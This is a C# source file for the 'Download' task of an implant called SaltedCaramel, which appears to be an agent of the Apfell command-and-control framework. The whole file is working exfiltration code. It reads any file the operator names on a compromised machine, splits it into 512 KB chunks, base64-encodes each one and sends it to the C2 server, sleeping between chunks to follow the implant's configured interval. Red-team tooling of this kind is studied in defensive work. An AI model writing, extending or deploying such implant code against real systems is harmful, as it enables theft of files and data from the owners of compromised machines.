using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

/// <summary>
/// This task will download a file from a compromised system to the Apfell server
/// </summary>
namespace SaltedCaramel.Tasks
{
    public class Download
    {
        public static void Execute(SCTask task, SCImplant implant)
        {
            string filepath = task.@params;
            try // Try block for file upload task
            {
                // Get file info to determine file size
                FileInfo fileInfo = new FileInfo(filepath);
                long size = fileInfo.Length;
                Debug.WriteLine($"[+] Download - DOWNLOADING: {filepath}, {size} bytes");

                // Determine number of 512kb chunks to send
                long total_chunks = size / 512000;
                // HACK: Dumb workaround because longs don't have a ceiling operation
                if (total_chunks == 0)
                    total_chunks = 1;
                Debug.WriteLine($"[+] Download - File size = {size} ({total_chunks} chunks)");

                // Send number of chunks associated with task to Apfell server
                // Response will have the file ID to send file with
                SCTaskResp initial = new SCTaskResp(task.id, "{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}");
                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
                Debug.WriteLine($"[-] Download - Received reply, file ID: " + reply.file_id);


                // Send file in chunks
                for (int i = 0; i < total_chunks; i++)
                {
                    byte[] chunk = null;
                    long pos = i * 512000;

                    // We need to use a FileStream in case our file size in bytes is larger than an Int32
                    // With a filestream, we can specify a position as a long, and then use Read() normally
                    using (FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        fs.Position = pos;

                        // If this is the last chunk, size will be the remaining bytes
                        if (i == total_chunks - 1)
                        {
                            chunk = new byte[size - (i * 512000)];
                            int chunkSize = chunk.Length;
                            fs.Read(chunk, 0, chunkSize);
                        }
                        // Otherwise we'll read 512kb from the file
                        else
                        {
                            chunk = new byte[512000];
                            fs.Read(chunk, 0, 512000);
                        }
                    }

                    // Convert chunk to base64 blob and create our FileChunk
                    FileChunk fc = new FileChunk();
                    fc.chunk_num = i;
                    fc.file_id = reply.file_id;
                    fc.chunk_data = Convert.ToBase64String(chunk);

                    // Send our FileChunk to Apfell server
                    SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fc));
                    Debug.WriteLine($"[+] Download - CHUNK SENT: {fc.chunk_num}");
                    Debug.WriteLine($"[-] Download - RESPONSE: {implant.PostResponse(response)}");
                    // Make sure we respect the sleep setting
                    Thread.Sleep(implant.sleep);
                }

                // Tell the Apfell server file transfer is done
                implant.SendComplete(task.id);
                Debug.WriteLine($"[+] Download - File transfer complete: {filepath}");
            }
            catch (Exception e) // Catch any exception from file upload
            {
                // Something failed, so we need to tell the server about it
                task.status = "error";
                task.message = e.Message;
            }

        }
    }
}
